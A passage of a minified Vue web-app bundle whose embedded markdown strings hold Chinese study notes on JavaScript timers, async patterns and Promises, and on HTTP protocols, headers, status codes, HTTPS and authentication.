与”扩展模式”相比，“宽扩展模式”就是“立即执行函数”的参数可以是空对象。\r\n\r\n\t- 输入全局变量\r\n\r\n\t\t- 独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。\r\n\t\t- 为了在模块内部调用全局变量，必须显式地将其他变量输入模块。\r\n\r\n\t\t\t- 上面的module1模块需要使用jQuery库和YUI库，就把这两个库（其实是两个模块）当作参数输入module1。这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。\r\n\r\n## 阮一峰·JS语法 专题\r\n\r\n### 定时器\r\n\r\n- setTimeout()\r\n\r\n  过了一定时间执行一次，只执行一次。比如隔一秒后执行一次，过了十万八千秒后也只在第一秒执行了一次，仅有的一次\r\n\r\n\t- 参数\r\n\r\n\t\t- 除了前两个参数，setTimeout还允许添加更多的参数。它们将被传入推迟执行的函数（回调函数）。\r\n\r\n\t- 需要注意的地方\r\n\r\n\t\t- 如果被setTimeout推迟执行的回调函数是某个对象的方法，那么该方法中的this关键字将指向全局环境，而不是定义时所在的那个对象。\r\n\r\n- setInterval()\r\n\r\n  每间隔一定时间执行一次，循环往复。比如每隔一秒执行一次，六十秒过后执行了60次\r\n\r\n\t- 应用\r\n\r\n\t\t- 一个通过setInterval方法实现网页动画的例子\r\n\r\n\t\t- setInterval的一个常见用途是实现轮询。下面是一个轮询URL的Hash值是否发生变化的例子。\r\n\r\n\t- 注意\r\n\r\n\t\t- setInterval指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，两次执行之间的间隔会小于指定的时间。比如，setInterval指定每100ms执行一次，每次执行需要5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。\r\n\r\n\t- 用setTimeOut代替\r\n\r\n\t\t- 为了确保两次执行之间有固定的间隔，可以不用setInterval，而是每次执行结束后，使用setTimeout指定下一次执行的具体时间。\r\n\r\n- clearTimeout()，clearInterval()\r\n\r\n\t- 函数防抖\r\n\r\n\t\t- 就是如果用户连续击键，就会连续触发keydown事件，造成大量的Ajax通信。这是不必要的，而且很可能会发生性能问题。正确的做法应该是，设置一个门槛值，表示两次Ajax通信的最小间隔时间。如果在设定的时间内，发生新的keydown事件，则不触发Ajax通信，并且重新开始计时。如果过了指定时间，没有发生新的keydown事件，将进行Ajax通信将数据发送出去。\r\n\t\t- 这种做法叫做debounce（防抖动）方法，用来返回一个新函数。只有当两次触发之间的时间间隔大于事先设定的值，这个新函数才会运行实际的任务。假定两次Ajax通信的间隔不小于2500毫秒，上面的代码可以改写成下面这样。\r\n\r\n\t\t\t- $('textarea').on('keydown', ajaxAction);\r\n\t\t\t- $('textarea').on('keydown', debounce(ajaxAction, 2500))\r\n\t\t- 注意\r\n\r\n\t\t\t- 现实中，最好不要设置太多个setTimeout和setInterval，它们耗费CPU。比较理想的做法是，将要推迟执行的代码都放在一个函数里，然后只对这个函数使用setTimeout或setInterval。\r\n\r\n- 应用\r\n\r\n\t- 它的一大应用是，可以调整事件的发生顺序。比如，网页开发中，某个事件先发生在子元素，然后冒泡到父元素，即子元素的事件回调函数，会早于父元素的事件回调函数触发。如果，我们先让父元素的事件回调函数先发生，就要用到setTimeout(f, 0)。\r\n\r\n\t- 用户自定义的回调函数，通常在浏览器的默认动作之前触发。比如，用户在输入框输入文本，keypress事件会在浏览器接收文本之前触发。因此，下面的回调函数是达不到目的的。\r\n\r\n\t- 由于setTimeout(f,0)实际上意味着，将任务放到浏览器最早可得的空闲时段执行，所以那些计算量大、耗时长的任务，常常会被放到几个小部分，分别放到setTimeout(f,0)里面执行。\r\n\r\n\t\t\t- 上面代码有两种写法，都是改变一个网页元素的背景色。写法一会造成浏览器“堵塞”，因为JavaScript执行速度远高于DOM，会造成大量DOM操作“堆积”，而写法二就不会，这就是setTimeout(f, 0)的好处。\r\n\t\t\t- 另一个使用这种技巧的例子是代码高亮的处理。如果代码块很大，一次性处理，可能会对性能造成很大的压力，那么将其分成一个个小块，一次处理一块，比如写成setTimeout(highlightNext, 50)的样子，性能压力就会减轻。\r\n\r\n### Promise对象\r\n\r\n- JavaScript的异步执行\r\n\r\n\t- 概述\r\n\r\n\t\t- JavaScript 语言本身并不慢，慢的是读写外部数据，比如等待 Ajax 请求返回结果。这个时候，如果对方服务器迟迟没有响应，或者网络不通畅，就会导致脚本的长时间停滞。\r\n\t\t- 异步模式\r\n\r\n\t\t\t- “异步模式”中，每一个任务分成两段，第一段代码包含对外部数据的请求，第二段代码被写成一个回调函数，包含了对外部数据的处理。第一段代码执行完，不是立刻执行第二段代码，而是将程序的执行权交给第二个任务。等到外部数据返回了，再由系统通知执行第二段代码。所以，程序的执行顺序与任务的排列顺序是不一致的、异步的。\r\n\r\n\t- 回调函数\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- 假定有两个函数f1和f2，后者必须等到前者执行完成，才能执行。这时，可以考虑改写f1，把f2写成f1的回调函数。\r\n\r\n\t\t- 优缺点\r\n\r\n\t\t\t- 回调函数的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合（Coupling），使得程序结构混乱、流程难以追踪（尤其是回调函数嵌套的情况），而且每个任务只能指定一个回调函数。\r\n\r\n\t- 事件监听\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- \r\n另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。\r\n\r\n\t\t- 做法\r\n\r\n\t\t\t- 还是以f1和f2为例。首先，为f1绑定一个事件（这里采用的jQuery的写法）。\r\n\r\n\t\t\t\t- f1.on('done', f2);\r\n\r\n\t\t\t- 上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：\r\n\r\n\t\t\t\t- function f1(){\r\n  setTimeout(function () {\r\n    // f1的任务代码\r\n    f1.trigger('done');\r\n  }, 1000);\r\n}\r\n\r\n\t\t\t- 上面代码中，f1.trigger('done')表示，执行完成后，立即触发done事件，从而开始执行f2。\r\n\r\n\t\t- 优缺点\r\n\r\n\t\t\t- 这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合“（Decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。\r\n\r\n\t- 发布/订阅\r\n\r\n\t\t- 定义\r\n\r\n\t\t\t- “事件”完全可以理解成”信号”，如果存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式“，又称”观察者模式“。\r\n\r\n\t\t- 实现（采用一个插件来实现）\r\n\r\n\t\t\t- 首先，f2向”信号中心”jQuery订阅”done”信号。\r\n\r\n\t\t\t- 然后，f1进行如下改写：\r\n\r\n\t\t\t- f2完成执行后，也可以取消订阅（unsubscribe）。\r\n\r\n\t\t- 优缺点\r\n\r\n\t\t\t- 这种方法的性质与”事件监听”类似，但是明显优于后者。因为我们可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。\r\n\r\n- 异步操作的流程控制\r\n\r\n\t- 初步认识\r\n\r\n\t\t- 如果有多个异步操作，就存在一个流程控制的问题：确定操作执行的顺序，以后如何保证遵守这种顺序。\r\n\t\t- 回调函数的嵌套\r\n\r\n\t\t\t- async函数是一个异步任务，非常耗时，每次执行需要1秒才能完成，然后再调用回调函数。\r\n\r\n\t\t\t- 如果有6个这样的异步任务，需要全部完成后，才能执行下一步的final函数。\r\n\r\n\t\t\t- 只能采用6个回调函数的嵌套，不仅写起来麻烦，易出错，且难维护\r\n\r\n\t- 串行执行\r\n\r\n\t\t- 我们可以编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。这就叫串行执行。\r\n\t\t\t- 此处定义的async第一个参数是异步任务的参数，第二个参数是异步任务的回调函数，这里回调函数直接在调用的时候才定义\r\n\r\n\t\t- 上面代码中，函数series就是串行函数，它会依次执行异步任务，所有任务都完成后，才会执行final函数。items数组保存每一个异步任务的参数，results数组保存每一个异步任务的运行结果。\r\n\r\n\t- 并行执行\r\n\r\n\t\t- 流程控制函数也可以是并行执行，即所有异步任务同时执行，等到全部完成以后，才执行final函数。\r\n\t\t- 上面代码中，forEach方法会同时发起6个异步任务，等到它们全部完成以后，才会执行final函数。\r\n\t\t- 优缺点\r\n\r\n\t\t\t- 并行执行的好处是效率较高，比起串行执行一次只能执行一个任务，较为节约时间。但是问题在于如果并行的任务较多，很容易耗尽系统资源，拖慢运行速度。因此有了第三种流程控制方式。\r\n\r\n\r\n\r\n\t\t- 所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行n个异步任务。这样就避免了过分占用系统资源。\r\n\t\t- 上面代码中，最多只能同时运行两个异步任务。变量running记录当前正在运行的任务数，只要低于门槛值，就再启动一个新的任务，如果等于0，就表示所有任务都执行完了，这时就执行final函数。\r\n\r\n- Promise对象\r\n\r\n\t- 简介\r\n\r\n\t\t- Promise 对象是 CommonJS 工作组提出的一种规范，目的是为异步操作提供统一接口。\r\n\t\t- 初步认识\r\n\r\n\t\t\t- 首先，它是一个对象，也就是说与其他JavaScript对象的用法，没有什么两样；其次，它起到代理作用（proxy），充当异步操作与回调函数之间的中介。它使得异步操作具备同步操作的接口，使得程序具备正常的同步运行的流程，回调函数不必再一层层嵌套。\r\n\r\n\t\t- 三种状态\r\n\r\n\t\t\t- 异步操作未完成（pending）\r\n\t\t\t- 异步操作成功（fulfilled）\r\n\t\t\t- 异步操作失败（rejected）\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- 它的思想是，每一个异步任务立刻返回一个Promise对象，由于是立刻返回，所以可以采用同步操作的流程。这个Promises对象有一个then方法，允许指定回调函数，在异步任务完成后调用。\r\n\r\n\t\t\t\t- 比如，异步操作f1返回一个Promise对象，它的回调函数f2写法如下。\r\n\r\n\t\t\t\t- 这种写法对于多层嵌套的回调函数尤其方便。\r\n\r\n\t\t- 总结\r\n\r\n\t\t\t- 总的来说，传统的回调函数写法使得代码混成一团，变得横向发展而不是向下发展。Promises规范就是为了解决这个问题而提出的，目标是使用正常的程序流程（同步），来处理异步操作。它先返回一个Promise对象，后面的操作以同步的方式，寄存在这个对象上面。等到异步操作有了结果，再执行前期寄放在它上面的其他操作。\r\n\r\n\t- Promise接口\r\n\r\n\t\t- Promise接口的基本思想是，异步任务返回一个Promise对象。\r\n\t\t- Promise对象的最终结果只有两种。\r\n\r\n\t\t\t- 异步操作成功，Promise对象传回一个值，状态变为resolved。\r\n\t\t\t- 异步操作失败，Promise对象抛出一个错误，状态变为rejected。\r\n\r\n\t\t- 回调函数then\r\n\r\n\t\t\t- Promise对象使用then方法添加回调函数。then方法可以接受两个回调函数，第一个是异步操作成功时（变为resolved状态）时的回调函数，第二个是异步操作失败（变为rejected）时的回调函数（可以省略）。一旦状态改变，就调用相应的回调函数。\r\n\r\n\t\t\t- then方法可以链式使用。\r\n\r\n- Promise的应用\r\n\r\n",At={data:function(){return{MainComponent:Ot}}},It=At,Dt=Object(u["a"])(It,Rt,Lt,!1,null,"759ae5ee",null),Pt=Dt.exports,Nt={mixins:[xn["a"]],components:{m1:Pr,m2:Ur,m3:Qr,m4:tt,m5:ct,m6:vt,m7:xt,m8:Mt,m9:Pt},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"循环遍历",value:"m1"},{label:"Event Loop",value:"m2"},{label:"js基础",value:"m3"},{label:"js高阶",value:"m4"},{label:"es6归纳1",value:"m5"},{label:"es6归纳2",value:"m6"},{label:"阮一峰JS总结",value:"m9"},{label:"jquery",value:"m8"},{label:"正则",value:"m7"}]}}},qt=Nt,Ht=Object(u["a"])(qt,Mr,Rr,!1,null,"38442c34",null),Bt=Ht.exports,Ft=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},Ut=[],Jt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},zt=[],Wt="# http\r\n\r\n## Web 及网络协议基础\r\n\r\n### 网络基础TCP/IP\r\n\r\n- 通常使用的网络是在TCP/IP协议族的基础上运作的，HTTP属于他内部的一个子集\r\n- 把与互联网相关联的协议集合起来总称为 TCP/IP\r\n- TCP/IP 协议族按层次分别分为以下 4 层:应用层、传输层、网络层和数据链路层\r\n- 发送端在层与层之间传输数据时,每经过一层时必定会被打上一个该层所属的首部信息。\r\n反之,接收端在层 与层传输数据时,每经过一层时会把对应的首部消去\r\n\r\n### 与 HTTP 关系密切的协议：IP、TCP和DNS\r\n\r\n- IP 协议的作用是把各种数据包传送给对方\r\n- IP 地址指明了节点被分配到的地址,MAC 地址是指网卡所属的固定地址。\r\n- 在进行中转时,会利用下一站中转设备的 MAC 地址来搜索下一 个中转目标。这时,会采用 ARP 协议\r\n- 无论哪台计算机、哪台网络设备,它们都无法全面掌握互联网中的细节\r\n- 按层次分,TCP 位于传输层,提供可靠的字节流服务。\r\n- 将大块数据分割成以报文段为单位的数据包进行管理\r\n- TCP 协 议为了更容易传送大数据才把数据分割\r\n- TCP 协议采用了三次握手(three-way handshaking)策略\r\n\r\n\t-  若在握手过程中某个阶段莫名中断，TCP 协议\r\n会再次以相同的顺序发送相同的数据包\r\n\r\n- DNS 协议提供通过域名查找 IP 地址,或逆向从 IP 地址反查域名 的服务\r\n\r\n### URL 和 URL\r\n\r\n- URL 正是使用 Web 浏览器等访问 Web 页面时需要输入的网页地址\r\n- URI 就是由某个协议方案表示的资源的定位标识符\r\n\r\n## 构建 Web 内容的技术\r\n\r\n### HTML\r\n\r\n- HTML5 标准不仅解决了浏览器之间的兼容性问题,并且可把文本作为数据对待,更容易复用,动画等效果也 变得更生动。\r\n- CSS(Cascading Style Sheets,层叠样式表)可以指定如何展现 HTML 内的各种元素,属于样式表标准之一\r\n- 所谓动态 HTML(Dynamic HTML),是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总 称。\r\n- DOM 是用以操作 HTML 文档和 XML 文档的 API(\r\n\r\n### Web 应用\r\n\r\n- Web 应用是指通过 Web 功能提供的应用程序\r\n- CGI(Common Gateway Interface,通用网关接口)是指 Web 服务器在接收到客户端发送过来的请求后转发 给程序的一组机制\r\n- 随着 CGI 的普及,每次请求都要启动新 CGI 程序的 CGI 运行机制逐渐变成了性能瓶颈,\r\n所以之后 Servlet 和 mod_perl 等可直接在 Web 服务器上运行的程序才得以开发、普及\r\n\r\n### 数据发布的格式及语言\r\n\r\n- XML(eXtensible Markup Language,可扩展标记语言)是一种可按应用目标进行扩展的通用标记语言\r\n- RSS(简易信息聚合,也叫聚合内容)和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称\r\n- JSON(JavaScript Object Notation)是一种以 JavaScript(ECMAScript)的对象表示法为基础的轻量级数据 标记语言\r\n\r\n## 基于 HTTP 的功能追加协议\r\n\r\n### 消除HTTP 瓶颈的 SPDY\r\n\r\n- 其开发目标旨在解决 HTTP 的性能瓶颈,缩短 Web 页面的加载时间(50%)\r\n- 一条连接上只可发送一个请求。\r\n-  请求只能从客户端开始。 客户端不可以接收除响应以外的指令。\r\n-  请求 / 响应首部未经压缩就发送。 首部信息越多延迟越大。\r\n-  发送冗长的首部。 每次互相发送相同的首部造成的浪费较多。\r\n-  可任意选择数据压缩格式。 非强制压缩发送。\r\n- SPDY 没有完全改写 HTTP 协议,而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作\r\n- 多路复用流\r\n\r\n\t- 通过单一的 TCP 连接,可以无限制处理多个 HTTP 请求\r\n\r\n- 赋予请求优先级\r\n\r\n\t- SPDY 不仅可以无限制地并发处理请求,还可以给请求逐个分配优先级顺序\r\n\r\n- 压缩 HTTP 首部\r\n\r\n\t- 压缩 HTTP 请求和响应的首部\r\n\r\n- 推送功能\r\n\r\n\t- 支持服务器主动向客户端推送数据的功能\r\n\r\n- 服务器提示功能\r\n\r\n\t- 服务器可以主动提示客户端请求所需的资源\r\n\r\n- SPDY 的确是一种可有效消除 HTTP 瓶颈的技术,但很多 Web 网站存在的问题并非仅仅是由 HTTP 瓶颈所 导致\r\n\r\n### 使用浏览器进行全双工通信的WebSocket\r\n\r\n- 一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接,之后所有的通信都依靠这个专用协议进 行。\r\n- 连接的发起方仍是客户端,而一旦确立 WebSocket 通信连接,不 论服务器还是客户端,任意一方都可直接向对方发送报文\r\n- 支持由服务器向客户端推送数据的推送功能。\r\n- 和 HTTP 相比,不但每次连接时的总开销减少, 而且由于 WebSocket 的首部信息很小,通信量也相应减少了\r\n\r\n### 期盼已久的HTTP/2.0\r\n\r\n- HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验。\r\n\r\n### Web 服务器管理文件的 WebDAV\r\n\r\n- 一 个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统\r\n\r\n## HTTP 报文内的 HTTP信息\r\n\r\n### HTTP 报文\r\n\r\n- 用于 HTTP 协议交互的信息被称为 HTTP 报文\r\n- HTTP 报文大致可分为报文首部和报文主体两块\r\n\r\n### 报文结构\r\n\r\n- 请求行\r\n- 状态行\r\n- 首部字段\r\n- 其他\r\n\r\n### 编码提升传输速率\r\n\r\n- 通过在传 输时编码,能有效地处理大量的访问请求。但是,编码的操作需要计算机来完成,因此会消耗更多的 CPU 等 资源\r\n- 报文\r\n\r\n\t- 是 HTTP 通信中的基本单位,由 8 位组字节流(octet sequence,其中 octet 为 8 个比特)组成,通过 HTTP 通信传输\r\n\r\n- 实体\r\n\r\n\t- 作为请求或响应的有效载荷数据(补充项)被传输,其内容由实体首部和实体主体组成\r\n\r\n- 向待发送邮件内增加附件时,为了使邮件容量变小,我们会先用 ZIP 压缩文件之后再添加附件发送\r\n- 常用的内容编码有以下几种\r\n\r\n\t- gzip( GNU zip)\r\n\t- compress( UNIX 系统的标准压缩)\r\n\t- deflate ( zlib)\r\n\t- identity(不进行编码)\r\n\r\n- 在 HTTP 通信过程中,请求的编码实体资源尚未全部传输完成之前,浏览器无法显示请求页面。\r\n\r\n### 发送多种数据的多部分对象集合\r\n\r\n- 在 MIME 扩展中会使用一种称为多部分对象集合(Multipart)的方法,来容纳多份不同类型的数据\r\n- 多部分对象集合包含的对象\r\n\r\n\t- multipart/form-data\r\n\t- multipart/byteranges\r\n\t- multipart/form-data\r\n\t- multipart/byteranges\r\n\r\n- 在 HTTP 报文中使用多部分对象集合时,需要在首部字段里加上 Content-type\r\n\r\n### 获取部分内容的范围请求\r\n\r\n- 执行范围请求时,会用到首部字段 Range 来指定资源的 byte 范围。\r\n\r\n### 内容协商返回最合适的内容\r\n\r\n- 当浏览器的默认语言为英语或中文,访问相同 URI 的 Web 页面时,则会显示对应的英语版或中文版的 Web 页面。这样的机制称为内容协商(\r\n- 内容协商机制是指客户端和服务器端就响应的资源内容进行交涉,然后提供给客户端最为适合的资源\r\n- 由服务器端进行内容协商。以请求的首部字段为参考,在服务器端自动处理\r\n- 由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择\r\n- 是服务器驱动和客户端驱动的结合体,是由服务器端和客户端各自进行内容协商的一种方法\r\n- Accept Accept-Charset Accept-Encoding Accept-Language Content-Language\r\n\r\n## 与 HTTP 协作的 Web 服务器\r\n\r\n### 用单台虚拟主机实现多个域名\r\n\r\n- HTTP/1.1 规范允许一台 HTTP 服务器搭建多个 Web 站点\r\n\r\n### 通信数据转发程序 :代理、网关、隧道\r\n\r\n- 代理\r\n\r\n\t- 代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器\r\n\t- 缓存代理\r\n\t- 透明代理\r\n\r\n- 网关\r\n\r\n\t- 利用网关可以由 HTTP 请求转化为其他协议通信\r\n\r\n- 隧道\r\n\r\n\t- 隧道的目的是确保 客户端能与服务器进行安全的通信\r\n\r\n### 保存资源的缓存\r\n\r\n- 代理服务器\r\n\r\n\t- 缓存是指代理服务器或客户端本地磁盘内保存的资源副本\r\n\r\n- 缓存的有效期限\r\n\r\n\t- 即使存在缓存,也会因为客户端的要求、缓存的有效期等因素,向源服务器确认资源的有效性\r\n\r\n- 客户端的缓存\r\n\r\n\t- 浏览器缓存如果有效,就不必再向服务器请求相同的资源了,可以直接从本地磁盘内读取\r\n\r\n## HTTP 头部\r\n\r\n###   HTTP 报文的结构\r\n\r\n- 在请求中,HTTP 报文由方法、URI、HTTP 版本、HTTP 首部字段等部分构成。\r\n- 在响应中,HTTP 报文由 HTTP 版本、状态码(数字和原因短语)、HTTP 首部字段 3 部分构成\r\n\r\n### HTTP 首部字段\r\n\r\n- HTTP 首部字段是由首部字段名和字段值构成的,中间用冒号“:” 分隔。\r\n- 字段值对应单个 HTTP 首部字段可以有多个值\r\n- 4 种 HTTP 首部字段类型\r\n\r\n\t- 通用首部字段( General Header Fields)\r\n\t- 请求首部字段( Request Header Fields)\r\n\t- 响应首部字段( Response Header Fields)\r\n\t- 实体首部字段( Entity Header Fields)\r\n\r\n### HTTP/1.1 首部字段一览\r\n\r\n- Cache-Control\r\n\r\n\t- 控制缓存行为\r\n\r\n- Connection\r\n\r\n\t- 逐跳首部、连接的管理\r\n\r\n- Date\r\n\r\n\t- 创建报文的日期时间\r\n\r\n- Pragma\r\n\r\n\t- 报文指令\r\n\r\n- Trailer\r\n\r\n\t- 报文末端的首部一览\r\n\r\n- Transfer-Encoding\r\n\r\n\t- 指定报文主体的传输编码方式\r\n\r\n- Upgrade\r\n\r\n\t- 升级为其他协议\r\n\r\n- Via\r\n\r\n\t- 代理服务器的相关信息\r\n\r\n- Warning\r\n\r\n\t- 错误通知\r\n\r\n- Accept\r\n\r\n\t- 用户代理可处理的媒体类型\r\n\r\n- Accept-Charset\r\n\r\n\t- 优先的字符集\r\n\r\n- Accept-Encoding\r\n\r\n\t- 优先的内容编码\r\n\r\n- Accept-Language\r\n\r\n\t- 优先的语言(自然语言)\r\n\r\n- Authorization\r\n\r\n\t- Web认证信息\r\n\r\n- Expect\r\n\r\n\t- 期待服务器的特定行为\r\n\r\n- From\r\n\r\n\t- 用户的电子邮箱地址\r\n\r\n- Host\r\n\r\n\t- 请求资源所在服务器\r\n\r\n- If-Match\r\n\r\n\t- 比较实体标记(ETag)\r\n\r\n- If-Modified-Since\r\n\r\n\t- 比较资源的更新时间\r\n\r\n- If-None-Match\r\n\r\n\t- 比较实体标记(与 If-Match 相反)\r\n\r\n- If-Range\r\n\r\n\t- 资源未更新时发送实体 Byte 的范围请求\r\n\r\n- If-Unmodified-Since\r\n\r\n\t- 比较资源的更新时间(与If-Modified-Since相反)\r\n\r\n- Max-Forwards\r\n\r\n\t- 最大传输逐跳数\r\n\r\n- Proxy-Authorization\r\n\r\n\t- 代理服务器要求客户端的认证信息\r\n\r\n- Range\r\n\r\n\t- 实体的字节范围请求\r\n\r\n- Referer\r\n\r\n\t- 对请求中 URI 的原始获取方\r\n\r\n- TE\r\n\r\n\t- 传输编码的优先级\r\n\r\n- User-Agent\r\n\r\n\t- HTTP 客户端程序的信息\r\n\r\n- Accept-Ranges\r\n\r\n\t- 是否接受字节范围请求\r\n\r\n- Age\r\n\r\n\t- 推算资源创建经过时间\r\n\r\n- ETag\r\n\r\n\t- 资源的匹配信息\r\n\r\n- Location\r\n\r\n\t- 令客户端重定向至指定URI\r\n\r\n- Proxy-Authenticate\r\n\r\n\t- 代理服务器对客户端的认证信息\r\n\r\n- Retry-After\r\n\r\n\t- 对再次发起请求的时机要求\r\n\r\n- Server\r\n\r\n\t- HTTP服务器的安装信息\r\n\r\n- Vary\r\n\r\n\t- 代理服务器缓存的管理信息\r\n\r\n- WWW-Authenticate\r\n\r\n\t- 服务器对客户端的认证信息\r\n\r\n- Allow\r\n\r\n\t- 资源可支持的HTTP方法\r\n\r\n- Content-Encoding\r\n\r\n\t- 实体主体适用的编码方式\r\n\r\n- Content-Language\r\n\r\n\t- 实体主体的自然语言\r\n\r\n- Content-Length\r\n\r\n\t- 实体主体的大小(单位:字节)\r\n\r\n- Content-Location\r\n\r\n\t- 替代对应资源的URI\r\n\r\n- Content-MD5\r\n\r\n\t- 实体主体的报文摘要\r\n\r\n- Content-Range\r\n\r\n\t- 实体主体的位置范围\r\n\r\n- Content-Type\r\n\r\n\t- 实体主体的媒体类型\r\n\r\n- Expires\r\n\r\n\t- 实体主体过期的日期时间\r\n\r\n- Last-Modified\r\n\r\n\t- 资源的最后修改日期时间\r\n\r\n- 还有 Cookie、 Set-Cookie 和 Content-Disposition 等在其他 RFC 中定义的首部字段,它们的使用频率也很高\r\n\r\n### End-to-end 首部和 Hop-by-hop 首部\r\n\r\n- 端到端首部( End-to-end Header)\r\n- 逐跳首部( Hop-by-hop Header)\r\n\r\n## 确保 Web 安全的 HTTPS\r\n\r\n### HTTP 的缺点\r\n\r\n- 通信使用明文(不加密), 内容可能会被窃听\r\n- 不验证通信方的身份, 因此有可能遭遇伪装\r\n- 无法证明报文的完整性, 所以有可能已遭篡改\r\n\r\n### HTTP+ 加密 + 认证 + 完整性保护 =HTTPS\r\n\r\n- 我们把添加了加密及认证机制 的 HTTP 称为 HTTPS\r\n- 只是 HTTP 通信接口部分用 SSL(Secure Socket Layer)和TLS(Transport Layer Security)协议代替而已\r\n- SSL 是独立于 HTTP 的协议,所以不光是 HTTP 协议,其他运行在应用层的 SMTP 和 Telnet 等协议均可配 合 SSL 协议使用\r\n- SSL 采用一种叫做公开密钥加密(Public-key cryptography)的加密处理方式\r\n- 加密和解密都会用到密钥。没有密钥就无法对密码解密,反过来说,任何人只要持有密钥就能解密了\r\n- 加密和解密同用一个密钥的方式称为共享密钥加密(Common key crypto system),也被叫做对称密钥 加密\r\n- 公开密钥加密使用一对非对称的密钥。一把叫做私有密钥(private key),另一把叫做公开密钥(public key)\r\n- HTTPS 采用混合加密机制\r\n- 数字证书认证机构(CA,Certificate Authority)和其相关机关颁发的公开密 钥证书\r\n\r\n## 返回结果的 HTTP 状态码\r\n\r\n### 状态码的职责\r\n\r\n- 当客户端向服务器端发送请求时,描述返回的请求结果\r\n\r\n### 状态码的大致分类\r\n\r\n- 1XX\r\n\r\n\t- 信息性状态码\r\n\r\n\t\t- 接收的请求正在处理\r\n\r\n- 2XX\r\n\r\n\t- 成功状态码\r\n\r\n\t\t- 请求正常处理完毕\r\n\r\n- 3XX\r\n\r\n\t- 重定向状态码\r\n\r\n\t\t- 需要进行附加操作以完成请求\r\n\r\n- 4XX\r\n\r\n\t- 客户端错误状态码\r\n\r\n\t\t- 服务器无法处理请求\r\n\r\n- 5XX\r\n\r\n\t- 服务器错误状态码\r\n\r\n\t\t- 服务器处理请求出错\r\n\r\n### 2XX 成功\r\n\r\n- 200 OK\r\n\r\n\t- 表示从客户端发来的请求在服务器端被正常处理了\r\n\r\n- 204 No Content\r\n\r\n\t- 该状态码代表服务器接收的请求已成功处理,但在返回的响应报文中不含实体的主体部分\r\n\r\n- 206 Partial Content\r\n\r\n\t- 该状态码表示客户端进行了范围请求,而服务器成功执行了这部分的 GET 请求\r\n\r\n### 3XX 重定向\r\n\r\n- 301 Moved Permanently\r\n\r\n\t- 永久性重定向。该状态码表示请求的资源已被分配了新的 URI,以后应使用资源现在所指的 URI。\r\n\r\n- 302 Found\r\n\r\n\t- 临时性重定向。该状态码表示请求的资源已被分配了新的 URI,希望用户(本次)能使用新的 URI 访问\r\n\r\n- 303 See Other\r\n\r\n\t- 该状态码表示由于请求对应的资源存在着另一个 URI,应使用 GET 方法定向获取请求的资源\r\n\t- 303 状态码和 302 Found 状态码有着相同的功能,但 303 状态码明确表示客户端应当采用 GET 方法获取资 源\r\n\r\n- 304 Not Modified\r\n\r\n\t- 该状态码表示客户端发送附带条件的请求 2 时,服务器端允许请求访问资源,但未满足条件的情况\r\n\r\n- 307 Temporary Redirect\r\n\r\n\t- 临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET\r\n\r\n### 4XX 客户端错误\r\n\r\n- 400 Bad Request\r\n\r\n\t- 该状态码表示请求报文中存在语法错误\r\n\r\n- 401 Unauthorized\r\n\r\n\t- 该状态码表示发送的请求需要有通过 HTTP 认证(BASIC 认证、DIGEST 认证)的认证信息\r\n\r\n- 403 Forbidden\r\n\r\n\t- 该状态码表明对请求资源的访问被服务器拒绝了\r\n\r\n- 404 Not Found\r\n\r\n\t- 该状态码表明服务器上无法找到请求的资源\r\n\r\n### 5XX 服务器错误\r\n\r\n- 500 Internal Server Error\r\n\r\n\t- 该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障\r\n\r\n- 503 Service Unavailable\r\n\r\n\t- 该状态码表明服务器暂时处于超负载或正在进行停机维护,现在无法处理请求\r\n\r\n## 确认访问用户身份的认证\r\n\r\n### 何为认证\r\n\r\n- 密码:只有本人才会知道的字符串信息。\r\n- 动态令牌:仅限本人持有的设备内显示的一次性密码\r\n- 数字证书:仅限本人(终端)持有的信息\r\n- 生物认证:指纹和虹膜等本人的生理信息。\r\n- IC 卡等:仅限本人持有的信息\r\n- BASIC 认证(基本认证)\r\n- DIGEST 认证(摘要认证)\r\n- SSL 客户端认证\r\n- FormBase 认证(基于表单认证)\r\n\r\n### BASIC 认证\r\n\r\n- BASIC 认证(基本认证)是从 HTTP/1.0 就定义的认证方式。\r\n- BASIC 认证使用上不够便捷灵活,且达不到多数 Web 网站期望的安全性等级,因此它并不常用。\r\n- 步骤 1: 当请求的资源需要 BASIC 认证时,服务器会随状态码 401 Authorization Required,返回带 WWW-Authenticate 首部字段的响应\r\n- 步骤 2: 接收到状态码 401 的客户端为了通过 BASIC 认证,需要将用户 ID 